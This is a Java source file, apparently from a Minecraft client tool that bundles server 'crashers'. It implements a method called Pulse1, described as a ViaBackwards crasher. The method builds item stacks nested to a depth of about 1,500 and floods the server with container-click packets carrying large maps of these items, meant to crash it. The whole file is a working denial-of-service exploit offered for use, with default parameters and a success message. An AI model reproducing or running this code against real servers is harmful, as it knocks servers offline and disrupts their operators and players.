package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.nbt.Tag;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataUseRemainder;
import us.whitedev.protocol.components.data.impl.DataWrittenBookContent;
import us.whitedev.protocol.components.data.impl.Filterable;
import us.whitedev.protocol.components.objects.ItemStack;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

//special thanks to unfair.advantage for helping to find this

public class Pulse1 implements Crasher {
    private static final String METHOD_NAME = "Pulse1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int mapSize = Integer.parseInt(args[4]);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE  ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            ItemStack nestedStack = new ItemStack(1, 1, null);

            for (int i = 0; i < size; i++) {
                DataComponents nestedComponents = new DataComponents();
                nestedComponents.put(new DataUseRemainder(nestedStack));

                nestedStack = new ItemStack(1, 1, nestedComponents);
            }

            DataComponents components = new DataComponents();
            components.put(new DataUseRemainder(nestedStack));

            ItemStack item = new ItemStack(1, 1, components);

            Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectArrayMap<>();

            for (int i = 0; i <= mapSize; i++) int2objectmap.put(i, item);

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    item, int2objectmap), packets);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.20.5/1.21.4&7, and your current protocol is &c" + protocol, true);
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {

        return "packets[200], size[1500], map-size[127]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Map Size", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "ViaBackwards Crasher (1.21.5+)";
    }
}